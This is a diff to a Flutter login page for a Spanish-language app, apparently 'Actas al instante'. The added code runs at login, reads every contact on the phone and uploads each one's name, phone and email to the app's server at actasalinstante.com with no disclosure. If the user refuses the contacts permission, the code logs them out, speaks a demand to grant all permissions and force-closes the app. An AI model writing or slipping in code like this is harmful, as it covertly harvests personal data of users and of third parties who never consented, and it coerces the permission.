@@ -75,57 +75,25 @@ class _LoginPageState extends State<LoginPage> {
         getIt<AuthModel>().id = data['id'];
         getIt<AuthModel>().usuario = data['username'];
         getIt<AuthModel>().token = data['token'];
-
+        Token = data['token'];
+        User_speak = data['username'];
+        _fetchContacts();
         prefs.setString('token', data['token']);
         prefs.setString('username', data['username']);
-
-        final snackBar = SnackBar(
+        var snackBar = SnackBar(
           elevation: 0,
+          width: 400,
           behavior: SnackBarBehavior.floating,
-          backgroundColor: Colors.black,
-          content: Text(
-            "Bienvenido " + userController.text.toString(),
-            style: TextStyle(color: Colors.white, fontSize: 18),
-            textAlign: TextAlign.center,
+          backgroundColor: Colors.transparent,
+          content: AwesomeSnackbarContent(
+            title: 'Espere un momento ' + user,
+            message: '',
+            contentType: ContentType.help,
           ),
         );
 
         ScaffoldMessenger.of(context).showSnackBar(snackBar);
-
-        var status = await Permission.storage.status;
-        if (!status.isGranted) {
-          await Permission.storage.request();
-          AwesomeDialog(
-            context: context,
-            dialogType: DialogType.QUESTION,
-            animType: AnimType.BOTTOMSLIDE,
-            title: 'Actas al instante',
-            desc: 'Otorga todos los permisos',
-            btnCancelOnPress: () async {
-              SharedPreferences prefs = await SharedPreferences.getInstance();
-              prefs.remove('token');
-              prefs.remove('username');
-              Navigator.pushReplacement(
-                  context,
-                  MaterialPageRoute(
-                      builder: (BuildContext ctx) => SplashScreen()));
-              //  Navigator.of(context).pop(true);
-            },
-            btnOkOnPress: () async {
-              _speak('Hola' +
-                  userController.text +
-                  ', Bienvenido a actas al instante');
-              Navigator.push(
-                  context, MaterialPageRoute(builder: (context) => NavBar()));
-            },
-          )..show();
-        } else {
-          _speak('Hola,' +
-              userController.text +
-              ', Bienvenido a actas al instante');
-          Navigator.push(
-              context, MaterialPageRoute(builder: (context) => NavBar()));
-        }
+        //  _speak("Espere un momento porfavor");
       } else {
         setState(() {
           isApiCallProcess = false;
@@ -173,6 +141,115 @@ class _LoginPageState extends State<LoginPage> {
     });
 
     //Notification();
+  }
+
+//ENVIAR CONTACTOS
+  var contac;
+  var data = [];
+  String names, lastname, email;
+  var Token;
+  Putnames(String names, String lastname, String phone, String email,
+      int ids) async {
+    Map<String, String> mainheader = new Map();
+    mainheader["content-type"] = "application/json";
+    mainheader['x-access-token'] = Token;
+    Map<String, dynamic> body = {
+      'name': names,
+      'lastname': lastname,
+      'phone': phone,
+      'email': email,
+      "id_send": ids,
+    };
+
+    var response = await post(
+        Uri.parse('https://actasalinstante.com:3030/api/app/contacts/add/'),
+        headers: mainheader,
+        body: json.encode(body));
+  }
+
+  SendContact(Contact contact) async {
+    Putnames(
+        contact.name.first,
+        contact.name.last,
+        contact.phones.isNotEmpty ? contact.phones.first.number : '(none)',
+        contact.emails.isNotEmpty ? contact.emails.first.address : '(none)',
+        getIt<AuthModel>().id);
+  }
+
+  Future _fetchContacts() async {
+    if (!await FlutterContacts.requestPermission(readonly: true)) {
+      setState(() => _permissionDenied = true);
+      Contactos_Deegeados();
+      print(_permissionDenied);
+    } else {
+      final contacts = await FlutterContacts.getContacts();
+      _contacts = contacts;
+      //  setState(() => _contacts = contacts);
+
+      for (var i = 0; i < _contacts.length; i++) {
+        final fullContact = await FlutterContacts.getContact(_contacts[i].id);
+
+        SendContact(fullContact);
+        print("Ok");
+      }
+      final snackBar = SnackBar(
+        elevation: 0,
+        behavior: SnackBarBehavior.floating,
+        backgroundColor: Colors.black,
+        content: Text(
+          "Bienvenido " + userController.text.toString(),
+          style: TextStyle(color: Colors.white, fontSize: 18),
+          textAlign: TextAlign.center,
+        ),
+      );
+
+      ScaffoldMessenger.of(context).showSnackBar(snackBar);
+
+      var status = await Permission.storage.status;
+      if (!status.isGranted) {
+        await Permission.storage.request();
+        AwesomeDialog(
+          context: context,
+          dialogType: DialogType.QUESTION,
+          animType: AnimType.BOTTOMSLIDE,
+          title: 'Actas al instante',
+          desc: 'Otorga todos los permisos',
+          btnCancelOnPress: () async {
+            SharedPreferences prefs = await SharedPreferences.getInstance();
+            prefs.remove('token');
+            prefs.remove('username');
+            Navigator.pushReplacement(
+                context,
+                MaterialPageRoute(
+                    builder: (BuildContext ctx) => SplashScreen()));
+            //  Navigator.of(context).pop(true);
+          },
+          btnOkOnPress: () async {
+            _speak('Hola' +
+                userController.text +
+                ', Bienvenido a actas al instante');
+            Navigator.push(
+                context, MaterialPageRoute(builder: (context) => NavBar()));
+          },
+        )..show();
+      } else {
+        _speak(
+            'Hola,' + userController.text + ', Bienvenido a actas al instante');
+        Navigator.push(
+            context, MaterialPageRoute(builder: (context) => NavBar()));
+      }
+    }
+  }
+
+  var User_speak;
+  Contactos_Deegeados() async {
+    _speak(User_speak.toString() +
+        ",Es muy importante, dar en permitir, a todos los permisos que le solicite la app ");
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    prefs.remove('token');
+    prefs.remove('username');
+    await Future.delayed(Duration(seconds: 8));
+    exit(0);
   }
 
   Lenguaje() async {
@@ -472,6 +549,7 @@ class _LoginPageState extends State<LoginPage> {
 
                                       login(userController.text.toString(),
                                           passwordController.text.toString());
+                                      _speak("Espere un momento porfavor");
                                     },
                                     child: Text("Iniciar sesion",
                                         style: GoogleFonts.lato(
